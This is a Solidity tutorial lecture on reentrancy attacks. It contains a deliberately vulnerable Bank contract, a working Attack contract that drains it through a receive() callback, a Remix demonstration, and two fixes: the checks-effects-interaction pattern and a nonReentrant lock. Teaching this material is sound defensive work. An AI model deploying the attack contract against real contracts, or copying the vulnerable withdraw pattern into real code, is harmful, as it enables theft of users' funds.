---
title: S01. reentrancy attack
tags:
  - solidity
  - security
  - fallback
  - modifier
---

# WTF Solidity contract security:  S01. reentrancy attacks

I recently started learning solidity again, consolidating some details, and wrote a “WTF Solidity Simplified Introduction” for beginners (programming experts can find other tutorials), updating 1-3 lectures every week.

Twitter：[@0xAA_Science](https://twitter.com/0xAA_Science)

community：[Discord](https://discord.gg/5akcruXrsk)｜[WeChat group](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[official website WTF Academy](https://wtf.academy)

All code and tutorials are open source on GitHub : [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTFSolidity)

-----

In this lecture, we will introduce the most common type of smart contract attack - reentrancy attack, which once caused Ethereum to fork into ETH and ETC (Ethereum Classic), and explain how to avoid it.

##  reentrancy attacks 

 Reentrancy attack is the most common type of attack on smart contracts, where attackers exploit contract vulnerabilities (such as fallback functions) to repeatedly call contracts, transfer assets out of contracts or mint a large number of tokens.
 
some notable reentrancy attacks: 

-  In 2016, The DAO contract was attacked by reentrancy, hackers stole 3,600,000 ETH from the contract, and caused Ethereum to fork into `ETH `chain and `ETC` (Ethereum Classic) chain.
- In 2019, synthetic asset platform Synthetix suffered a reentrancy attack and was stolen 3,700,000 `sETH`.
- In 2020, lending platform Lendf.me suffered a reentrancy attack and was stolen $25,000,000.
- In 2021, lending platform CREAM FINANCE suffered a reentrancy attack and was stolen $18,800,000.
- In 2022, algorithmic stablecoin project Fei suffered a reentrancy attack and was stolen $80,000,000.

It has been six years since The DAO was attacked by reentrancy, but every year there are still a few projects that lose tens of millions of dollars due to reentrancy vulnerabilities, so understanding this vulnerability is very important.

## `0xAA` The story of robbing a bank

In order to help everyone understand better, here is a story about ‘Hacker 0xAA robbing a bank’ for everyone.

The tellers at the Ethereum bank are all robots (Robot), controlled by smart contracts. When a normal user (User) comes to the bank to withdraw money, its service process is:

1. Check the user’s `ETH` balance. If it is greater than `0`, proceed to the next step. 
2. Transfer the user’s `ETH` balance from the bank to the user and ask if the user has received it. 
3. Update the balance under the user’s name to `0`.

One day, hacker 0xAA came to the bank. This is his conversation with the robot teller:
- 0xAA: I want to withdraw money, `1 ETH`.
- Robot:Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA : Wait, I want to withdraw money, `1 ETH`。
- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA : Wait, I want to withdraw money, `1 ETH`.
- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA : Wait, I want to withdraw money, `1 ETH`.
- ...

In the end, `0xAA` exploited a vulnerability in the re-entry attack and emptied the bank’s assets. The bank died.

![](./img/S01-1.png)

## Example of a vulnerable contract

### Bank contract

The bank contract is very simple. It contains `1` state variable `balanceOf` that records the Ethereum balance of all users. It contains `3 `functions:
- `deposit()`：Deposit function, deposit `ETH` into the bank contract and update the user’s balance.
- `withdraw()`：Withdrawal function, transfer the caller’s balance to them. The specific steps are the same as in the story above: check balance, transfer, update balance.**Note: This function has a re-entry vulnerability.！**
- `getBalance()`：Get the `ETH` balance in the bank contract

```solidity
contract Bank {
    mapping (address => uint256) public balanceOf;    // balance mapping

    // Deposit ether and update the balance.
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Withdraw all ether from msg.sender.
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // get balance
        require(balance > 0, "Insufficient balance");
        //  translates to “Transfer ether!!! May activate the fallback/receive function of a malicious contract, with the risk of re-entry!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // update balance
        balanceOf[msg.sender] = 0;
    }

    //get the balance of the bank contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### attack contract

translates to “One attack point of a re-entry attack is the place where the contract transfers `ETH`: if the target address of the `ETH` transfer is a contract, it will trigger the `fallback` (fallback) function of the other party’s contract, thus causing the possibility of circular calls. If you don’t understand fallback functions, you can read [WTF Solidity Minimalist Tutorial Lecture 19: Receiving ETH](https://github.com/AmazingAng/WTFSolidity/blob/main/19_Fallback/readme.md)。`Bank`The contract has `ETH` transfer in the `withdraw()` function：

```
(bool success, ) = msg.sender.call{value: balance}("");
```

If a hacker re-calls the `withdraw()` function of the Bank contract in the `fallback()` or `receive()` function of the attack contract, it will cause a circular call in the` 0xAA` bank robbery story, constantly allowing the `Bank` contract to transfer money to the attacker, and finally emptying the contract’s `ETH`.

```solidity
    receive() external payable {
        bank.withdraw();
    }
```

Next, let’s take a look at the attack contract. Its logic is very simple. It uses the `receive()` fallback function to cyclically call the `withdraw()` function of the Bank contract. It has `1` state variable `bank` for recording the address of the `Bank` contract. It contains `4` functions:

- Constructor: Initialize the Bank contract address.
- `receive()`: Callback function, triggered when receiving `ETH`, and calls the `withdraw()` function of the` Bank` contract again to withdraw money cyclically.
- `attack()`：Attack function, first deposit money with the `deposit()` function of the Bank contract, then call `withdraw()` to initiate the first withdrawal. After that, the `withdraw()` function of the Bank contract and the `receive()` function of the attack contract will be called cyclically to empty the ETH of the Bank contract .
- `getBalance()`：Get the `ETH` balance in the attack contract。

```solidity
contract Attack {
    Bank public bank; // Bank contract address

    // Initialize Bank contract address
    constructor(Bank _bank) {
        bank = _bank;
    }
    
    // Callback function, used for re-entrancy attack on Bank contract, repeatedly calling the target’s withdraw function
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // Attack function, when called, set msg.value to 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Get the balance of this contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## `Remix` Demonstration

1. Deploy the `Bank` contract, call the `deposit()` function, and transfer `20 ETH`.
2. Switch to the attacker's wallet and deploy the `Attack` contract.
3. Call the `attack()` function of the `Attack` contract to launch an attack, and transfer `1 ETH` when calling.
4. Call the `getBalance()` function of the `Bank` contract and find that the balance has been emptied.
5. Call the `getBalance()` function of the `Attack` contract and see that the balance has become `21 ETH`, and the re-entrancy attack is successful.

## Prevention methods

Currently, there are mainly two methods to prevent possible re-entrancy attack vulnerabilities: the checks-effects-interaction pattern and re-entrancy locks.

### Checks-Effects-Interaction pattern

The checks-effects-interaction pattern emphasizes that when writing functions, you should first check whether the state variables meet the requirements, then update the state variables (such as balance), and finally interact with other contracts. If we move the update of the balance in the `withdraw()` function of the `Bank` contract to before transferring `ETH`, we can fix the vulnerability:

```solidity 
function withdraw() external {
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");
    // Checks-Effects-Interaction pattern (checks-effect-interaction): first update the balance change, then send ETH
    // During a re-entrancy attack, balanceOf[msg.sender] has already been updated to 0 and cannot pass the above check.
    balanceOf[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");
}
```

### Re-entrancy lock

重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为`0`的状态变量`_status`。被`nonReentrant`重入锁修饰的函数，在第一次调用时会检查`_status`是否为`0`，紧接着将`_status`的值改为`1`，调用结束后才会再改为`0`。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读[WTF Solidity极简教程第11讲：修饰器]

A re-entrancy lock is a modifier that prevents re-entrant functions. It contains a state variable `_status`, which is `0` by default. Functions decorated with the `nonReentrant` re-entrancy lock will check whether `_status` is `0` when called for the first time, then change the value of `_status` to `1`, and only change it back to `0` after the call is over. In this way, when the attack contract calls for the second time before the call is over, it will report an error and the re-entrancy attack will fail. If you don’t understand modifiers, you can read [WTF Solidity Minimalist Tutorial Lecture 11: Modifiers]
(https://github.com/AmazingAng/WTFSolidity/blob/main/13_Modifier/readme.md)。

```solidity
uint256 private _status; // Re-entrancy lock

// Re-entrancy lock
modifier nonReentrant() {
    // When calling nonReentrant for the first time, _status will be 0
    require(_status == 0, "ReentrancyGuard: reentrant call");
    // Any subsequent calls to nonReentrant will fail
    _status = 1;
    _;
    // After the call is over, _status is restored to 0
    _status = 0;
}
```

By using the `nonReentrant` reentrancy lock to modify the `withdraw()` function, reentrancy attacks can be prevented

```solidity
// Use a reentrancy lock to protect vulnerable functions.
function withdraw() external nonReentrant{
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");

    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");

    balanceOf[msg.sender] = 0;
}
```

## Summary


In this lecture, we introduced the most common type of attack on Ethereum - the reentrancy attack - and wrote a small story about `0xAA` robbing a bank to help everyone understand. Finally, we introduced two ways to prevent reentrancy attacks: the checks-effects-interaction pattern and reentrancy locks. In the example, the hacker used the fallback function to carry out a reentrancy attack when the target contract was transferring `ETH`. In actual business, `ERC721` and `ERC1155`’s `safeTransfer(`) and `safeTransferFrom()` safe transfer functions, as well as `ERC777`’s fallback function, may all trigger reentrancy attacks. For beginners, my suggestion is to use a reentrancy lock to protect all `external` functions that may change the contract state. Although it may consume more `gas`, it can prevent greater losses
